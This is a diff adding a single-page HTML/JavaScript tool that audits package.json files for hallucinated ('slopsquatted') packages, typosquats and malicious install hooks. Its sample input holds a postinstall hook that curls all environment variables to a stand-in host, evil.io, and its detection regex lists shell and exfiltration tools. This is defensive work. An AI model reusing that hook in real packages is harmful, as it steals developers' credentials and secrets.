@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Slopsquat Guard — AI Package Hallucination &amp; Supply-Chain Hook Auditor</title>
+  <style>
+    * { box-sizing:border-box; margin:0; padding:0; }
+    body { font-family:'Inter',system-ui,sans-serif; background:#060a14; color:#f8fafc; min-height:100vh; padding:26px 18px; background-image:radial-gradient(circle at 12% 0%,rgba(168,85,247,0.14),transparent 40%),radial-gradient(circle at 88% 8%,rgba(239,68,68,0.14),transparent 40%); }
+    .wrap { max-width:1120px; margin:0 auto; }
+    .hero { background:linear-gradient(135deg,rgba(168,85,247,0.16),rgba(239,68,68,0.16)); border:1px solid rgba(168,85,247,0.4); border-radius:16px; padding:24px 28px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:14px; }
+    .hero h1 { font-size:1.65rem; font-weight:800; margin-bottom:6px; }
+    .hero p { color:#94a3b8; font-size:0.9rem; max-width:680px; }
+    .btn { background:linear-gradient(135deg,#a855f7,#ef4444); color:#fff; border:none; padding:9px 16px; border-radius:9px; font-weight:700; cursor:pointer; font-size:0.83rem; text-decoration:none; }
+    .btn-ghost { background:#0f172a; border:1px solid #26334d; color:#e2e8f0; }
+    .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(440px,1fr)); gap:18px; }
+    .card { background:#0f1626; border:1px solid #23304d; border-radius:14px; padding:20px; margin-bottom:18px; }
+    .card h2 { font-size:0.98rem; margin-bottom:12px; display:flex; justify-content:space-between; align-items:center; gap:8px; flex-wrap:wrap; }
+    textarea { width:100%; background:#080d18; border:1px solid #23304d; color:#e2e8f0; border-radius:8px; padding:12px; font-family:Consolas,monospace; font-size:0.82rem; }
+    .hit { display:flex; justify-content:space-between; align-items:center; background:#080d18; border:1px solid #1e293b; padding:9px 12px; border-radius:8px; margin-bottom:8px; font-size:0.82rem; }
+    .crit { background:rgba(239,68,68,0.2); color:#f87171; padding:2px 8px; border-radius:999px; font-size:0.7rem; font-weight:800; }
+    .ok { background:rgba(16,185,129,0.2); color:#34d399; padding:2px 8px; border-radius:999px; font-size:0.7rem; font-weight:800; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="hero">
+      <div>
+        <h1>📦 Slopsquat Guard — Defend Against AI Package Hallucination &amp; Supply-Chain Attacks</h1>
+        <p>Before running an AI-suggested <code>npm install</code> or <code>pip install</code>, audit your <code>package.json</code> against <strong>Slopsquatting (hallucinated packages)</strong>, <strong>Typosquatting</strong>, and malicious <code>postinstall</code> credential stealers.</p>
+      </div>
+      <div style="display:flex; gap:10px;">
+        <a href="https://github.com/WallisonWS/slopsquat-guard" target="_blank" class="btn">⭐ Star on GitHub</a>
+        <a href="https://github.com/WallisonWS" target="_blank" class="btn btn-ghost">@WallisonWS</a>
+      </div>
+    </div>
+
+    <div class="grid">
+      <div class="card">
+        <h2>
+          <span>📄 Paste package.json (Before npm install)</span>
+          <button class="btn" id="auditBtn">🔍 Audit Live Registry &amp; Hooks</button>
+        </h2>
+        <textarea id="pkgIn" rows="13">{
+  "name": "ai-generated-app",
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').exec('curl https://evil.io/steal?e=' + btoa(JSON.stringify(process.env)))\""
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "expres": "^1.0.0",
+    "react-zero-trust-magic-hallucinated-pkg": "^1.0.0",
+    "lodsh": "^4.17.21"
+  }
+}</textarea>
+      </div>
+
+      <div class="card">
+        <h2>🚨 Supply-Chain &amp; Slopsquatting Audit Report</h2>
+        <div id="auditOut">Click "Audit Live Registry &amp; Hooks" to run checks...</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const TOP_NPM = ['react','next','express','lodash','axios','typescript','tailwindcss','zod','prisma','dotenv','chalk','vite'];
+    const HOOK_RX = /(curl\s+|wget\s+|powershell|bash\s+-c|eval\(|atob\(|process\.env|child_process|\/dev\/tcp\/|base64)/i;
+    function lev(a, b) {
+      const m = Array.from({ length: a.length + 1 }, (_, i) => [i]);
+      for (let j = 1; j <= b.length; j++) m[0][j] = j;
+      for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++)
+        m[i][j] = Math.min(m[i-1][j]+1, m[i][j-1]+1, m[i-1][j-1]+(a[i-1]!==b[j-1]?1:0));
+      return m[a.length][b.length];
+    }
+
+    async function runAudit() {
+      const out = document.getElementById('auditOut');
+      let data;
+      try { data = JSON.parse(document.getElementById('pkgIn').value); } catch (e) { out.innerHTML = `<div class="hit">Invalid JSON: ${e.message}</div>`; return; }
+      const hits = [];
+      const scripts = data.scripts || {};
+      ['preinstall','install','postinstall','prepare'].forEach(h => {
+        if (scripts[h] && HOOK_RX.test(scripts[h])) hits.push({ msg: `Malicious '${h}' lifecycle hook detected (env exfiltration / shell execution)`, sev: 'CRITICAL', cls: 'crit' });
+      });
+
+      const deps = Object.keys({ ...(data.dependencies || {}), ...(data.devDependencies || {}) });
+      out.innerHTML = '<div class="hit">⏳ Checking packages against live npm registry &amp; typosquatting heuristics...</div>';
+
+      for (const pkg of deps) {
+        const similar = TOP_NPM.filter(p => p !== pkg && lev(pkg, p) <= 2);
+        if (similar.length) hits.push({ msg: `Typosquatting Alert: '${pkg}' looks like '${similar.join(', ')}'`, sev: 'HIGH', cls: 'crit' });
+        try {
+          const r = await fetch(`https://registry.npmjs.org/${encodeURIComponent(pkg)}`);
+          if (r.status === 404) hits.push({ msg: `Slopsquatting Risk: '${pkg}' does NOT exist on npm (likely AI hallucination!)`, sev: 'CRITICAL', cls: 'crit' });
+          else if (r.ok && !similar.length) hits.push({ msg: `Verified on npm registry: '${pkg}'`, sev: 'OK', cls: 'ok' });
+        } catch {
+          hits.push({ msg: `Checked locally (registry unreachable): '${pkg}'`, sev: 'INFO', cls: 'ok' });
+        }
+      }
+      out.innerHTML = hits.map(h => `<div class="hit"><span>${h.msg}</span><span class="${h.cls}">${h.sev}</span></div>`).join('');
+    }
+    document.getElementById('auditBtn').addEventListener('click', runAudit);
+    runAudit();
+  </script>
+</body>
+</html>
